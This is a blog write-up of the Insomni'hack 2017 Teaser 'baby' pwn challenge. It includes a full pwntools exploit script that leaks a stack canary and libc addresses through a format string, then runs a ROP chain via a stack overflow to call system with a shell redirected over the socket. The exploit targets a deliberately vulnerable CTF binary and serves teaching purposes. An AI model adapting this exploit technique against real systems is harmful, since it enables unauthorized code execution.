---
layout: post
alias: "/blog/2017/01/25/insomnihack-2017-teaser-baby/"
date: "2017-01-25T20:04:37+09:00"
title: "Insomni'hack 2017 Teaser: baby"
tags: [ "ctf", "writeup", "pwn", "insomnihack", "fork-server" ]
"target_url": [ "https://teaser.insomnihack.ch/" ]
---

## problem

``` sh
$ nc baby.teaser.insomnihack.ch 1337
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 2
Simply type '\n' to return
Your format > %p
0x7ffe526fc100
Your format > 
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 1
How much bytes you want to send ? 3
foo
Good luck !
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 4
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

## solution

Leak addresses using format-string attack, and then do ROP using stack-overflow.
You talk with the binary via sockets, so you should do redirect, like: `system("sh -c \"sh <&4 >&4\"")`.

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='baby.teaser.insomnihack.ch')
parser.add_argument('port', nargs='?', default=1337, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='baby')
parser.add_argument('--libc', default='libc.so')
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)
libc = ELF(args.libc)

p = remote(args.host, args.port)

# leak
p.recvuntil('Your choice > ')
p.sendline('2')
#   canary
p.recvuntil('Your format > ')
p.sendline('%{}$llx'.format(138))
canary = int(p.recvline(), 16)
log.info('canary: %#x', canary)
#   stack addr
p.recvuntil('Your format > ')
p.sendline('%{}$llx'.format(139))
return_address = int(p.recvline(), 16) - 48
log.info('stack address: %#x', return_address)
#   program base
p.recvuntil('Your format > ')
p.sendline('%{}$llx'.format(141))
start = int(p.recvline(), 16)
log.info('_start: %#x', start)
program_base = start - elf.symbols['_start']
log.info('program base: %#x', program_base)
#   libc base
p.recvuntil('Your format > ')
p.sendline('%{}$llx'.format(158))
libc_start_main = int(p.recvline(), 16) - 240
log.info('__libc_start_main: %#x', libc_start_main)
libc_base = libc_start_main - libc.symbols['__libc_start_main']
log.info('libc base: %#x', libc_base)
#   done
p.sendline()

# attack
#   make payload
payload = ''
payload += 'A' * 0x408
payload += p64(canary)
payload += 'B' * 8
payload += p64(program_base + 0x1c8b) # pop rdi ; ret
payload += p64(return_address + 32)
payload += p64(libc_base + libc.symbols['system'])
payload += '/bin/sh -c "/bin/sh <&4 >&4"\0'
#   send payload
p.recvuntil('Your choice > ')
p.sendline('1')
p.recvuntil('How much bytes you want to send ? ')
p.sendline(str(len(payload)))
time.sleep(0.5)
p.sendline(payload)
#   done
time.sleep(1)
p.sendline('id')
p.interactive()
```
